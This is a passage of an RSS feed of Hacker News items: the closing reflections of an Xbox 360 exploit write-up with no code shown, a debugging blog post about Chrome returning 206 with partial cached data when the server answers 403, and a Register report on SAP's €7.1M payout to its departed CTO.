<li>No, this exploit does not provide a good user experience for those wanting to hack their Xbox 360 consoles. RGH is, and always will be the defacto boot-to-hacked-state exploit for the console.</li>
</ul>
</li>
</ul>



<h2>Conclusion</h2>



<p>This exploit took around two and half months to research, develop, and finish but it felt like an eternity. There were many times I thought I hit a dead end and had no path forward, only to spend a day or two thinking and coming up with something new to try. Finding and developing this exploit pushed my abilities as a security researcher, from understanding how the console worked, to finding ways to create attack surface when there otherwise wasn’t any, to using anything and everything I possibly could to help win the race condition and (quite literally) beat the CPU into submission. The constant need to think outside the box and turn nothing into something is part of what I love about being a security researcher, but it’s also exhausting.</p>



<p>Now that I’ve completed this exploit I’m going to retire from game console hacking (at least for the foreseeable future). I’ve learned all I wanted to learn and hacked all I wanted hacked, now it’s time I explore some new avenues. I want to give a big shout out to everyone who encouraged me to continue working on this through all the ups and downs, doom, “x”, and the Seabards for listening to all my rambling about L2 cache fuckery and the numerous times I thought I hit a dead end. Once again, a big thank you to everyone who read through this wall of text. Even though it’s quite long this blog post doesn’t even begin to capture all the work that made this exploit possible.</p>



<p>For anyone who wants to read more about the Xbox 360 inner workings I plan to write a part 3 where I’ll (briefly) cover some of my failed attempts at exploiting the console, and other interesting behavior/techniques I developed along the way. However, this part won’t be written for several months time so don’t count on it any time soon.</p>




									
																		
								</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Chrome Returns 206 when the Server Returns 403 (119 pts)]]></title>
            <link>https://aoli.al/blogs/chrome-bug/</link>
            <guid>43244680</guid>
            <pubDate>Mon, 03 Mar 2025 18:00:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://aoli.al/blogs/chrome-bug/">https://aoli.al/blogs/chrome-bug/</a>, See on <a href="https://news.ycombinator.com/item?id=43244680">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
  
  <section>
    <h2 id="postmortem">Postmortem</h2>
<p>It is a feature not a bug! I got detailed explanation from chrome developers which is very helpful. You may find the complete response in the <a href="https://issues.chromium.org/issues/390229583">bug ticket</a>. Also this blog post draws a lot of attention after I post it on Hackers News. You may find comments <a href="https://news.ycombinator.com/item?id=43244680">here</a>.</p>
<p><strong>Updates:</strong> I did know the people who replied my issue are not the developers as pointed out by a HN comment.</p>
<blockquote>
<p>I was also pretty surprised when the OP said “the Chromium team refused to use my server to reproduce the bug”, when the actual comments of the ticket were “clone this repo and run my giant node app” and the tester’s response was “It seems a bit difficult to set up an build environment to run the static server, could you provide a more minimal repro case?”. OP’s description of the tester’s reasonable concerns seems very unfair.</p></blockquote>
<p>And I would like to withdraw my statement about Chromium team refused to use my server to reproduce the bug. However, I do believing providing a place to allow users to showcase their weird servers is not a bad idea. Debugging and failure reproduction is always hard! I still think offering GCP credits to issue reporters is a practical approach😁.</p>
<p>You may continue to read the original post if you want to learn an interesting debugging experience.</p>
<h2 id="original-post">Original Post</h2>
<p>Sorry for the clickbait, but it is true.</p>
<p>I was helping my partner debug an interesting bug in his fancy <a href="https://github.com/XiangpengHao/parquet-viewer/issues/7">parquet viewer</a>. The website crashes when a user tries to access S3.</p>
<p>So the symptom is that <a href="https://github.com/apache/opendal">OpenDAL</a> (one of the parquet viewer’s dependencies) crashes because it did not receive enough data from S3 storage.</p>
<img src="https://aoli.al/images/chrome-bug/parquet-viewer-bug.png">
<h2 id="my-initial-attempt">My Initial Attempt</h2>
<p>Initially, I thought this was a bug inside OpenDAL, so I tried compiling everything on my native machine, but the bug disappeared. This allowed me to narrow the bugs to all WASM-related components.</p>
<p>My goal was to find the first program location where the data is lost. Unfortunately, debugging the WASM code is not fun, and I have fallen back to print debugging. So I was doing the following manually, starting with parquet viewer:</p>
<ol>
<li>download and compile the project</li>
<li>insert debugging code to print the size of the data</li>
<li>check if data is already shorter than expected</li>
<li>if true, download and compile the library it used to fetch the data and go back to step 1</li>
</ol>
<p>I have gone through Paquet Viewer, OpenDAL, and reqwest and all the way to the standard library. This process wasn’t easy, especially since I needed to find the right location to insert my debug code. Fortunately, LLMs helped me greatly.</p>
<p>But to my surprise, the application received chopped data from the very beginning.</p>
<h2 id="my-second-attempt">My Second Attempt</h2>
<p>Having spent a day debugging nothing was frustrating, and I was questioning what had gone wrong. As a reflection, the main issue of my debugging process is that I set the wrong <strong>trust boundary</strong> at the very beginning. I was assuming Chrome was functioning correctly and jumped into the rabbit hole of debugging application code.</p>
<p>After removing the trust boundary, the first thing I did was verify what exactly Chrome had received from the server. We found some surprising results with our old friend Wireshark: the server returns 403 for the second request. And more things are going on:</p>
<p>My client sends two requests to the server and I’m using the equivalent fetch command to show them:</p>
<p>The first request has range <code>4-138724</code>:</p>
<div><pre tabindex="0"><code data-lang="js"><span><span><span>fetch</span>(<span>"..."</span>, {
</span></span><span><span>  <span>"headers"</span><span>:</span> {
</span></span><span><span>    <span>"range"</span><span>:</span> <span>"bytes=4-138724"</span>,
</span></span><span><span>  },
</span></span><span><span>  <span>"body"</span><span>:</span> <span>null</span>,
</span></span><span><span>  <span>"method"</span><span>:</span> <span>"GET"</span>,
</span></span><span><span>  <span>"mode"</span><span>:</span> <span>"cors"</span>,
</span></span><span><span>  <span>"credentials"</span><span>:</span> <span>"omit"</span>
</span></span><span><span>})
</span></span></code></pre></div><p>The server successfully sends the requested data back and replied 206, and the Wireshark confirms that my server indeed responds to 206.</p>
<p>For the second request, it becomes interesting. The second request has a range <code>4-1943507</code>:</p>
<div><pre tabindex="0"><code data-lang="js"><span><span><span>fetch</span>(<span>"..."</span>, {
</span></span><span><span>  <span>"headers"</span><span>:</span> {
</span></span><span><span>    <span>"range"</span><span>:</span> <span>"bytes=4-1943507"</span>,
</span></span><span><span>  },
</span></span><span><span>  <span>"body"</span><span>:</span> <span>null</span>,
</span></span><span><span>  <span>"method"</span><span>:</span> <span>"GET"</span>,
</span></span><span><span>  <span>"mode"</span><span>:</span> <span>"cors"</span>,
</span></span><span><span>  <span>"credentials"</span><span>:</span> <span>"omit"</span>
</span></span><span><span>})
</span></span></code></pre></div><p>However, when Chrome sends the request to the server Wireshark shows that the real request is:</p>
<div><pre tabindex="0"><code data-lang="js"><span><span><span>fetch</span>(<span>"..."</span>, {
</span></span><span><span>  <span>"headers"</span><span>:</span> {
</span></span><span><span>    <span>"range"</span><span>:</span> <span>"bytes=138725-1943507"</span>,
</span></span><span><span>  },
</span></span><span><span>  <span>"body"</span><span>:</span> <span>null</span>,
</span></span><span><span>  <span>"method"</span><span>:</span> <span>"GET"</span>,
</span></span><span><span>  <span>"mode"</span><span>:</span> <span>"cors"</span>,
</span></span><span><span>  <span>"credentials"</span><span>:</span> <span>"omit"</span>
</span></span><span><span>})
</span></span></code></pre></div><p>The range field is changed. This is because Chrome noticed that the first <code>4-138724</code> bytes are already cached, and therefore, it only needs to request the rest part. Hmm, this sounds a great optimization to save data! But when the server responds, it becomes chaotic. Let’s first check what Chrome shows in the response:</p>
<img src="https://aoli.al/images/chrome-bug/chrome-response.png">
<p>Chrome says it has successfully gotten the data and even indicates bytes <code>4-1943507</code> in the response header. But in the response viewer, it shows that the response only has 138720 bytes of data!</p>
<img src="https://aoli.al/images/chrome-bug/chrome-data.png">
<p>This is crazy. Where did the rest of the data go? Now, if we go back to Wireshark, it will tell us that the second request to the server failed with 403 (it is another story why the server returns 403 for the second request)! However, Chrome still returns 206 to the application with only partial data.</p>
<h2 id="report-to-chromium-team">Report to Chromium Team</h2>
<p>This seems to be a bug in Chrome, so I decided to report it to the developers. To make their lives easier, I also created a buggy server to mimic the behavior I have encountered.</p>
<p>Here is the issue: <a href="https://issues.chromium.org/issues/390229583">https://issues.chromium.org/issues/390229583</a>. You may follow the steps to reproduce the bug if you are interested and I promise, it will not take more than 10 minutes.</p>
<p>Initially, I thought the developers would immediately acknowledge the issue and then fix it. But to my surprise, the issue was open for two months, and eventually, they thought it was a feature, not a bug.</p>
<img src="https://aoli.al/images/chrome-bug/feature-not-bug.png" width="250">
<p>After the issue was submitted, <del>the Chromium team refused to use my server to reproduce the bug and asked me to submit</del> a <a href="https://aoli.al/blogs/chrome-bug/%5Bhttps://www.chromium.org/for-testers/providing-network-details/%5D(https://www.chromium.org/for-testers/providing-network-details/)">network</a> log while reproducing it. So I did, out of curiosity. The Netlog looks scary because it not only contains the traffic while I reproduced the bug but also 1) all traffic from the Chrome plugins and 2) many websites that I have browsed before but haven’t visited during the recording. While I promise there is nothing in my browser history 😉. But I still don’t share it with public. So when I share my netlog, I added a restriction to the file.</p>
<img src="https://aoli.al/images/chrome-bug/restriction.png" width="400">
<p>But to my surprise, this blocks the Chromium team from accessing the file too. After all the back and forth, the Chromium team finally understands the issue. But they think this is a feature, not a bug, and you may find the complete response in the <a href="https://issues.chromium.org/issues/390229583">bug ticket</a>.</p>
<blockquote>
<p>All we’re saying is that this is how the range requests for partially-cached content in Chrome interact with the cache and it isn’t likely to change because there aren’t any really good ways to change the behavior that won’t also break existing applications. The existing behavior is at least consistent and can be worked with in application code by requesting the missing part of the range after the 2nd request completes (at which point you should get a 403 since none of the range overlaps with what is in cache).</p></blockquote>
<p>What a bug or a feature! I think I will probably stop tracking this issue since I’m working on neither web technologies nor browsers. I’m just a fan of tracking down and solving those elusive bugs. I opened an issue in <a href="https://github.com/apache/opendal/issues/5689">OpenDAL</a> because if Chrome is not going to fix it, they may need to fix it.</p>
<p>Also, maybe a lesson for me is that finding the right <strong>trust boundary</strong> can significantly speed up debugging!</p>

  </section>

  
</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ex-SAP CTO walks away with €7.1M payout after scandal (112 pts)]]></title>
            <link>https://www.theregister.com/2025/03/03/former_sap_cto_payout/</link>
            <guid>43244490</guid>
            <pubDate>Mon, 03 Mar 2025 17:44:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2025/03/03/former_sap_cto_payout/">https://www.theregister.com/2025/03/03/former_sap_cto_payout/</a>, See on <a href="https://news.ycombinator.com/item?id=43244490">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p>SAP paid former CTO Jürgen Müller €7.1 million ($7.5 million) after he left the German software company by mutual agreement in September last year.</p>
<p>Müller <a target="_blank" href="https://www.theregister.com/2024/09/03/sap_cto_departs/">departed</a> following an "incident" at a company event earlier in the year. At the time, SAP said its supervisory board had reached a "mutual agreement" with Müller for him to leave the company's executive board at the end of September.</p>
<p>In a prepared statement at the time, Müller said his behavior had been inappropriate. "I regret being inconsiderate and sincerely apologize to everyone affected. I recognize my behavior at that moment did not reflect our values at SAP."</p>

    

<p>Later, authorities <a target="_blank" href="https://www.theregister.com/2024/09/17/sap_cto_investigation/">confirmed</a> that the investigation related to allegations of sexual harassment.</p>

        


        

<p><a target="_blank" rel="nofollow" href="https://www.bloomberg.com/news/articles/2025-01-29/ex-sap-cto-settles-probe-over-inappropriate-conduct-claims">Reports</a> from January suggest that Müller had reached a settlement and that the investigation had ended. <em>The Register</em> has asked public prosecutor Staatsanwaltschaft Heidelberg to comment.</p>
<p>In a <a target="_blank" rel="nofollow" href="https://www.sap.com/docs/download/investors/2024/sap-2024-annual-report-form-20f.pdf">filing to the US Securities and Exchange Commission</a>, SAP documented its executive compensation. In addition to CEO Christian Klein receiving €19 million ($20 million) and Thomas Saueressig, board member for customer services and delivery, receiving €8.2 million ($8.6 million), the regulatory releases reveal total compensation to Müller of €7.14 million.</p>
<ul>

<li><a href="https://www.theregister.com/2025/02/14/sap_business_suite_revival/">Users await the fine print on SAP Business Suite reboot</a></li>

<li><a href="https://www.theregister.com/2025/02/13/sap_erp_revenue_trap/">SAP snared in revenue trap unless it extends legacy ERP support</a></li>

<li><a href="https://www.theregister.com/2024/09/17/sap_cto_investigation/">Prosecutors confirm probe into SAP CTO amid allegations of sexual harassment</a></li>

<li><a href="https://www.theregister.com/2024/09/03/sap_cto_departs/">SAP CTO bows out over 'incident' at company shindig</a></li>
</ul>
<p>The filing said Müller had reached a mutual agreement with the supervisory board to end his employment at SAP effective September 30, 2024.</p>
<p>Also departing this year was Scott Russell, who resigned from his position of chief revenue officer on August 31, 2024. He reached a "mutual agreement" with the supervisory board to end his employment at SAP effective December 31, 2024. A severance payment for the remainder of his original term of appointment until January 31, 2027, totaled €12.6 million ($13.2 million), while his total compensation reached €21.5 million ($22.5 million).</p>

        

<p>Julia White also exited the role of chief marketing and solutions officer, effective August 31, 2024. Her severance payment for the remainder of her original term of appointment until February 28, 2027, reached €9 million ($9.2 million), while her total compensation for 2024 was €17.1 million ($17.9 million).</p>
<p>For 2024, SAP said its cloud and software revenue was €29.96 billion ($31.5 billion), within the range of earlier forecasts, while its operating profit exceeded the forecast range to reach €8.2 billion ($8.6 billion).</p>
<p>The value of SAP's shares has risen by approximately 50 percent in the last year. ®</p>                                
                    </div></div>]]></description>
        </item>
    </channel>
</rss>